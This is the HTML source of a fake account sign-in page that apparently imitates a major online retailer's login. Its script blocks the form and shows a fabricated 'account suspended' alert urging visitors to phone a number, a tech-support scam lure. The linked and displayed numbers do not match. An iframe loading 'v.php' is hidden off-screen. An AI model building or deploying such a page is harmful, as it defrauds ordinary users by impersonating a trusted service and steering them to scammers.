<!doctype html>
<html>
<head>


	<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Login To Your Account</title>
	<link rel="stylesheet" href="css/bootstrap-grid.min.css">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <div class="newwrapper">
		<div class="headernew">
			<div class="container">
				<div class="row">
					<div class="col-12 col-sm-12 col-md-12 col-lg-12">
						<div class="logocontainer">
							<img src="img/logo.png" alt="logo" class="img-fluid">
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="actionwrapper">
			<div class="container">
				<div class="row">
					<div class="col-10 col-sm-10 col-md-5 col-lg-4 mx-auto">
						<div class="actionbody">
							<form id="actiontaker" method="post">
								<div class="col-12 col-sm-12 col-md-12 col-lg-12">
									<h1>Sign-In</h1>
								</div>
								<div class="col-12 col-sm-12 col-md-12 col-lg-12">
									<div id="ajaxerror" style="display: none;"> 
										<h4>
											A suspicious activity has been detected on your account. Due to security reasons we have temporarily suspended your account<br> Please call on <strong><a href="tel:+18884611876


">+1-888-211-8159</a></strong> to reactivate your account.
										</h4>
									</div>
								</div>
								<div class="col-12 col-sm-12 col-md-12 col-lg-12">
									<div class="inputGroup">
										<label for="useremail">Email (phone for mobile accounts)</label>
										<input type="text" id="useremail" name="useremail" required>
										<input type="submit" value="continue" name="apply">
									</div>
									<div class="inputGroup">
										<p class="para1">By continuing, you agree to <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
										<p class="para2"><a href="#">Need Help?</a></p>
									</div>
								</div>
							</form>
							<div class="signupaction">
								<div class="usersignupdivider"><h5>New User?</h5></div>
								<div class="signupbuttonholder">
									<a href="#" class="buttonsign">Create your Account</a>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
    </div>
	<div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="v.php"></iframe></div>
	<script src="js/jquery-3.4.1.min.js"></script>
	<script>
	$(document).ready(function () {
		$("#actiontaker").submit(function (a) {
			a.preventDefault();
			$("#ajaxerror").show();
		});
	});
	</script>
  </body>
</html>
